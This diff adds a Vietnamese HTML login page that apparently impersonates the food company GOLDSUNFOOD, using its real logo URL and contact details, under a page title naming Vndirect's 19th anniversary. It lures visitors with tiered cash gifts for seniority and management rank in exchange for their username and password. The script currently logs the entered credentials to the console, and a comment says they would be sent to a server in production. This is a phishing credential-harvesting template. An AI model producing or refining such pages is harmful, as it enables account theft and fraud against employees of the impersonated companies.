@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác nhận nhận quà - Vndirect 19 năm thành lập</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            position: relative;
+            overflow: hidden;
+            margin: 0;
+        }
+        /* Background grid pattern */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0,0,0,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,0,0,0.02) 1px, transparent 1px);
+            background-size: 50px 50px;
+            opacity: 0.5;
+            z-index: 0;
+        }
+        /* Background numbers/text */
+        body::after {
+            content: '25.45  578.64  16  892.3  45.2';
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 12px;
+            color: rgba(0,0,0,0.1);
+            font-weight: 300;
+            z-index: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+            max-width: 900px;
+            width: 100%;
+            overflow: hidden;
+            display: flex;
+            min-height: 500px;
+            position: relative;
+            z-index: 1;
+        }
+        /* Left side - Illustration */
+        .illustration-side {
+            flex: 1;
+            background: linear-gradient(180deg, #FFE082 0%, #FFB74D 100%);
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .illustration-side::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 30px 30px;
+            animation: move 20s linear infinite;
+        }
+        @keyframes move {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(30px, 30px); }
+        }
+        .illustration-content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            color: #fff;
+        }
+        .illustration-content h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .illustration-content p {
+            font-size: 14px;
+            opacity: 0.95;
+            margin-bottom: 20px;
+        }
+        .gift-illustration {
+            font-size: 80px;
+            margin: 20px 0;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.2));
+        }
+        .gift-stats {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .stat-item {
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(10px);
+            padding: 10px 18px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .stat-item strong {
+            display: block;
+            font-size: 18px;
+            margin-bottom: 3px;
+        }
+        .stat-item span {
+            font-size: 11px;
+            opacity: 0.9;
+        }
+        /* Right side - Login Form */
+        .form-side {
+            flex: 1;
+            background-color: #ffffff;
+            padding: 30px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .logo-section {
+            margin-bottom: 20px;
+        }
+        .logo-section img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 8px;
+        }
+        .logo-section h1 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        .logo-section p {
+            font-size: 12px;
+            color: #666;
+        }
+        .form-title {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #333;
+            font-weight: 500;
+            font-size: 13px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 13px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            background: #fff;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #FFB74D;
+            box-shadow: 0 0 0 3px rgba(255, 183, 77, 0.1);
+        }
+        .form-group input::placeholder {
+            color: #999;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+            font-size: 16px;
+            user-select: none;
+        }
+        .password-toggle:hover {
+            color: #FFB74D;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #FFB74D 0%, #FF9800 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            box-shadow: 0 4px 15px rgba(255, 183, 77, 0.3);
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 183, 77, 0.4);
+        }
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        .error-message {
+            background-color: #fee;
+            color: #c33;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            display: none;
+            border-left: 4px solid #c33;
+        }
+        .success-message {
+            background-color: #efe;
+            color: #3c3;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            display: none;
+            border-left: 4px solid #3c3;
+        }
+        .footer-info {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+        .footer-info a {
+            color: #FFB74D;
+            text-decoration: none;
+        }
+        /* Responsive */
+        @media (max-width: 968px) {
+            .container {
+                flex-direction: column;
+                max-width: 500px;
+                min-height: auto;
+            }
+            .illustration-side {
+                min-height: 200px;
+                padding: 20px;
+            }
+            .form-side {
+                padding: 25px 20px;
+            }
+            .gift-illustration {
+                font-size: 60px;
+            }
+        }
+        @media (max-width: 480px) {
+            .form-side {
+                padding: 20px 15px;
+            }
+            .logo-section h1 {
+                font-size: 16px;
+            }
+            .form-title {
+                font-size: 14px;
+            }
+            .container {
+                border-radius: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Left Side - Illustration -->
+        <div class="illustration-side">
+            <div class="illustration-content">
+                <div class="gift-illustration">🎁</div>
+                <h2>Chúc mừng 19 năm!</h2>
+                <p>Nhận phần quà đặc biệt từ GOLDSUNFOOD</p>
+                <div class="gift-stats">
+                    <div class="stat-item">
+                        <strong>500K</strong>
+                        <span>Tiền thưởng</span>
+                    </div>
+                    <div class="stat-item">
+                        <strong>1M</strong>
+                        <span>Thâm niên 10+</span>
+                    </div>
+                    <div class="stat-item">
+                        <strong>2M</strong>
+                        <span>Cấp quản lý</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Side - Login Form -->
+        <div class="form-side">
+            <div class="logo-section">
+                <img src="https://goldsunfood.vn/wp-content/uploads/2020/12/logo-goldsunfood.png" 
+                     alt="GOLDSUNFOOD Logo" 
+                     onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjgwIiB2aWV3Qm94PSIwIDAgMjAwIDgwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSIxMCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM0NDQ0NDQiPkdPTERTVU48L3RleHQ+Cjx0ZXh0IHg9IjEwIiB5PSI1NSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjI0IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0iIzQ0NDQ0NCI+Rk9PRDwvdGV4dD4KPGNpcmNsZSBjeD0iMTY1IiBjeT0iNDAiIHI9IjE4IiBmaWxsPSJub25lIi8+CjxwYXRoIGQ9Ik0xNTAgMzUgQzE1NSAzNSAxNjAgMzUgMTY1IDQwIEMxNzAgNDUgMTcwIDUwIDE2NSA1MCBDMTYwIDUwIDE1NSA1MCAxNTAgNDUgQzE0NSA0MCAxNDUgMzUgMTUwIDM1IFoiIGZpbGw9IiNGRkQ3MDAiLz4KPHBhdGggZD0iTTE2NSAzNSBDMTcwIDM1IDE3NSA0MCAxNzUgNDUgQzE3NSA1MCAxNzAgNTAgMTY1IDUwIEMxNjAgNTAgMTU1IDQ1IDE1NSA0MCBDMTU1IDM1IDE2MCAzNSAxNjUgMzUgWiIgZmlsbD0iI0ZGQkUwMCIvPgo8L3N2Zz4K';" />
+                <h1>GOLDSUNFOOD</h1>
+                <p>Công ty Ẩm thực mặt trời vàng</p>
+            </div>
+
+            <h2 class="form-title">Đăng nhập để nhận quà từ GOLDSUNFOOD</h2>
+
+            <div id="errorMessage" class="error-message"></div>
+            <div id="successMessage" class="success-message"></div>
+
+            <form id="loginForm" method="POST" action="#">
+                <div class="form-group">
+                    <label for="username">Tên đăng nhập</label>
+                    <input type="text" id="username" name="username" placeholder="Tên đăng nhập" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Mật khẩu</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Mật khẩu" required>
+                        <span class="password-toggle" id="togglePassword">👁️</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    ĐĂNG NHẬP
+                </button>
+            </form>
+
+            <div class="footer-info">
+                <p>Hotline: 1900234546 | Email: info@goldsunfood.vn</p>
+                <p><a href="https://goldsunfood.vn">www.goldsunfood.vn</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Ẩn các thông báo cũ
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            
+            // Lấy giá trị form
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Kiểm tra validation cơ bản
+            if (!username || !password) {
+                showError('Vui lòng điền đầy đủ thông tin!');
+                return;
+            }
+            
+            // Hiển thị thông báo thành công
+            showSuccess('Đang xử lý thông tin của bạn... Vui lòng đợi trong giây lát!');
+            
+            // Log dữ liệu (trong production sẽ gửi đến server)
+            console.log('Form Data:', {
+                username,
+                password
+            });
+        });
+        
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+        
+        function showSuccess(message) {
+            const successDiv = document.getElementById('successMessage');
+            successDiv.textContent = message;
+            successDiv.style.display = 'block';
+            successDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+    </script>
+</body>
+</html>
+
